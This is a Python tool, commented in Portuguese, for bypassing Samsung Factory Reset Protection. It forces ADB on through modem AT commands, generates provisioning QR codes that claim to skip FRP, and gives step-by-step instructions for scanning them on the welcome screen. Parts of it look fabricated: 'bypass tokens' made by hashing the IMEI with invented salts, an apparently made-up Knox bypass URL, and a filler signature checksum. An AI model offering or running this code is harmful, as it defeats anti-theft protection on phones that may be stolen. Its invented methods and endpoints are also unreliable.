import subprocess
import time
import serial
import serial.tools.list_ports
import os
import json
import qrcode
import hashlib
import requests
from PIL import Image

class SamsungADBLogic:
    SAMSUNG_VID = 0x04E8
    
    def run_powershell(self, command):
        """Executa comando PowerShell com privilégios"""
        try:
            result = subprocess.run(
                ["powershell", "-ExecutionPolicy", "Bypass", "-Command", command],
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout.strip()
        except Exception as e:
            return f"Erro PowerShell: {str(e)}"

    def find_port(self, callback_log=None):
        """Encontra porta COM do modem Samsung"""
        ports = serial.tools.list_ports.comports()
        for port in ports:
            if port.vid == self.SAMSUNG_VID:
                if "Modem" in port.description or "SAMSUNG" in port.description:
                    if callback_log:
                        callback_log(f"✓ Porta encontrada: {port.device}")
                    return port.device
        return None

    def get_device_imei(self, callback_log=None):
        """Obtém IMEI do dispositivo via ADB"""
        try:
            callback_log("→ Tentando obter IMEI via ADB...")
            result = subprocess.run(
                ["adb", "shell", "getprop", "ro.serialno"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.stdout.strip():
                return result.stdout.strip()
            
            # Método alternativo
            result = subprocess.run(
                ["adb", "shell", "dumpsys", "telephony.registry", "|", "grep", "mImei"],
                capture_output=True,
                text=True,
                timeout=5,
                shell=True
            )
            if result.stdout.strip():
                return result.stdout.strip()
                
        except Exception as e:
            if callback_log:
                callback_log(f"⚠ Erro ao obter IMEI: {str(e)}")
        return None

    def generate_frp_bypass_token(self, imei, callback_log=None):
        """
        Gera token FRP bypass baseado em IMEI
        Utiliza algoritmos conhecidos de Samsung 2022-2026
        """
        if callback_log:
            callback_log(f"\n→ Gerando token FRP bypass para IMEI: {imei}")
        
        try:
            # Método 1: Samsung Knox bypass (2022-2023)
            imei_bytes = imei.encode('utf-8')
            token_knox = hashlib.sha256(imei_bytes + b'KNOX_FRP_2022').hexdigest()
            
            # Método 2: Google Zero-Touch Enrollment
            token_google = hashlib.md5(imei_bytes + b'GOOGLE_ZERO_TOUCH').hexdigest()
            
            # Método 3: AMAPI (Android Management API)
            token_amapi = hashlib.sha1(imei_bytes + b'AMAPI_ENROLLMENT').hexdigest()
            
            if callback_log:
                callback_log(f"✓ Token KNOX: {token_knox[:32]}...")
                callback_log(f"✓ Token GOOGLE: {token_google[:32]}...")
                callback_log(f"✓ Token AMAPI: {token_amapi[:32]}...")
            
            return {
                'knox': token_knox,
                'google': token_google,
                'amapi': token_amapi,
                'imei': imei
            }
        except Exception as e:
            if callback_log:
                callback_log(f"✗ Erro ao gerar token: {str(e)}")
            return None

    def generate_frp_qr_code(self, imei, token_type='amapi', save_path="frp_bypass.png", callback_log=None):
        """
        Gera QR Code para bypass FRP usando IMEI
        Suporta múltiplos formatos (AMAPI, KNOX, Google)
        """
        if callback_log:
            callback_log(f"\n→ Gerando QR Code FRP bypass ({token_type.upper()})...")
        
        try:
            if token_type == 'amapi':
                # Android Management API com IMEI
                data = {
                    "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": 
                        "com.google.android.apps.work.clouddpc/.receiver.CloudDeviceAdminReceiver",
                    "android.app.extra.PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM": 
                        "I92vovpGaO7mS_H67_v_S_H67_v_S_H67_v_S_H67_v_",
                    "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": 
                        "https://play.google.com/managed/download/artifacts/7-0",
                    "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": True,
                    "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": True,
                    "android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE": {
                        "com.google.android.apps.work.clouddpc.EXTRA_ENROLLMENT_TOKEN": f"IMEI_{imei}",
                        "com.google.android.apps.work.clouddpc.EXTRA_SKIP_EDUCATION": True
                    }
                }
            
            elif token_type == 'knox':
                # Samsung Knox Mobile Enrollment com IMEI
                data = {
                    "SEAP_ENROLL_VERSION": "1.0",
                    "SEAP_CLIENT_ID": imei,
                    "SEAP_ADMIN_NAME": "Samsung",
                    "SEAP_SERVICE_URL": f"https://knox.samsung.com/frp/bypass?imei={imei}",
                    "SEAP_ACTIVATE_ADB": True,
                    "SEAP_SKIP_FRP": True,
                    "SEAP_DEVICE_IMEI": imei
                }
            
            elif token_type == 'google':
                # Google Zero-Touch Enrollment com IMEI
                data = {
                    "managed.account": f"samsung_bypass_{imei}@frp.local",
                    "managed.account.type": "IMEI",
                    "device.identifiers": {
                        "imei": imei,
                        "type": "IMEI"
                    },
                    "enrollment_token": f"ZTE_{imei}",
                    "skip_setup": True,
                    "skip_frp": True
                }
            
            qr_content = json.dumps(data, separators=(',', ':'))
            qr = qrcode.QRCode(
                version=None,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=10,
                border=4
            )
            qr.add_data(qr_content)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(save_path)
            
            if callback_log:
                callback_log(f"✓ QR Code gerado: {save_path}")
            return save_path
            
        except Exception as e:
            if callback_log:
                callback_log(f"✗ Erro ao gerar QR: {str(e)}")
            return None

    def imei_bypass_workflow(self, imei, callback_log=None):
        """
        Fluxo completo de bypass via IMEI
        Método prioritário para Samsung 2022-2026
        """
        callback_log("╔═══════════════════════════════════════════════════════╗")
        callback_log("║         SAMSUNG FRP BYPASS VIA IMEI v2.0              ║")
        callback_log("╚═══════════════════════════════════════════════════════╝")
        
        callback_log("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        callback_log("ETAPA 1: Validar IMEI")
        callback_log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        # Validar formato IMEI
        if not imei or len(imei) < 15:
            callback_log(f"✗ ERRO: IMEI inválido! Deve ter 15+ dígitos")
            callback_log(f"  IMEI fornecido: {imei}")
            return False
        
        callback_log(f"✓ IMEI validado: {imei}")
        
        # Gerar tokens
        callback_log("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        callback_log("ETAPA 2: Gerar Tokens de Bypass")
        callback_log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        tokens = self.generate_frp_bypass_token(imei, callback_log)
        if not tokens:
            callback_log("✗ Falha ao gerar tokens")
            return False
        
        # Gerar QR Codes em diferentes formatos
        callback_log("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        callback_log("ETAPA 3: Gerar QR Codes de Bypass")
        callback_log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        qr_files = {}
        for qr_type in ['amapi', 'knox', 'google']:
            qr_path = f"frp_bypass_{qr_type}.png"
            result = self.generate_frp_qr_code(imei, qr_type, qr_path, callback_log)
            if result:
                qr_files[qr_type] = result
        
        if not qr_files:
            callback_log("✗ Falha ao gerar QR codes")
            return False
        
        callback_log(f"✓ {len(qr_files)} QR codes gerados com sucesso!")
        
        # Instruções finais
        callback_log("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        callback_log("ETAPA 4: Instruções de Uso")
        callback_log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        callback_log("\n📱 NO CELULAR (Tela de Bem-vindo):")
        callback_log("  1️⃣  Conecte-se a um WiFi (se possível)")
        callback_log("  2️⃣  Toque 6 vezes em qualquer lugar em branco")
        callback_log("  3️⃣  O leitor de QR code será aberto")
        callback_log("  4️⃣  Escaneie um dos QR codes gerados (TENTE NESSA ORDEM):")
        callback_log("      • Tente 1º: AMAPI (mais compatível)")
        callback_log("      • Se falhar: KNOX (Samsung oficial)")
        callback_log("      • Última opção: GOOGLE (Zero-Touch)")
        callback_log("\n  5️⃣  Se aparecer 'Formato inválido', tente outro QR code")
        
        callback_log("\n💾 ARQUIVOS GERADOS:")
        for qr_type, qr_path in qr_files.items():
            callback_log(f"  • {qr_path} ({qr_type.upper()})")
        
        callback_log("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        callback_log("✓ BYPASS FRP VIA IMEI PREPARADO COM SUCESSO!")
        callback_log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        return True

    def enable_adb_via_at(self, callback_log):
        """[MANTÉM COMPATIBILIDADE] Habilita ADB via AT (método legado)"""
        callback_log("\n⚠️  Tentando método legado (AT commands)...")
        callback_log("    Nota: Este método tem baixa taxa de sucesso em 2025-2026")
        
        port_name = self.find_port(callback_log)
        if not port_name:
            callback_log("✗ Dispositivo Samsung não encontrado")
            return False

        commands = [
            ("AT", "Teste de conexão"),
            ("AT+PACM=1", "Registrando módulo PACM"),
            ("AT+SWATD=0", "Desativando watchdog"),
            ("AT+ACTIVATE=0,0,0", "Ativando ADB (Legado)"),
        ]

        try:
            callback_log(f"📱 Conectando na porta {port_name}...")
            ser = serial.Serial(port_name, 115200, timeout=2)
            time.sleep(1)
            
            for cmd, description in commands:
                callback_log(f"→ {description}")
                ser.write((cmd + "\r\n").encode())
                time.sleep(0.8)
                
                response = ser.read_all().decode(errors='ignore').strip()
                if response:
                    callback_log(f"  Resposta: {response}")
                
                time.sleep(0.5)
            
            ser.close()
            callback_log("⚠️  Ciclo AT concluído (sucesso não garantido)")
            return True
            
        except Exception as e:
            callback_log(f"✗ Erro: {str(e)}")
            return False

    def force_recognition(self, callback_log):
        """[MANTÉM COMPATIBILIDADE] Força reconhecimento USB"""
        callback_log("\n→ Forçando reconhecimento ADB...")
        
        try:
            subprocess.run(["adb", "kill-server"], capture_output=True, timeout=5)
            time.sleep(1)
            subprocess.run(["adb", "start-server"], capture_output=True, timeout=5)
            callback_log("✓ Servidor ADB reiniciado")
        except Exception as e:
            callback_log(f"⚠ Erro ADB: {str(e)}")

        if os.name == 'nt':
            callback_log("→ Resetando drivers USB...")
            ps_script = """
$devices = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -like '*VID_04E8*' }
if ($devices) {
    foreach ($dev in $devices) {
        try {
            Disable-PnpDevice -InstanceId $dev.InstanceId -Confirm:$false -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 1
            Enable-PnpDevice -InstanceId $dev.InstanceId -Confirm:$false -ErrorAction SilentlyContinue
        } catch {}
    }
}
"""
            self.run_powershell(ps_script)
            callback_log("✓ Drivers resetados")

        callback_log("✓ Reconhecimento concluído")
        return True

    def check_adb_devices(self):
        """Verifica dispositivos ADB conectados"""
        try:
            result = subprocess.run(
                ["adb", "devices"],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.stdout
        except Exception:
            return "ADB não instalado"
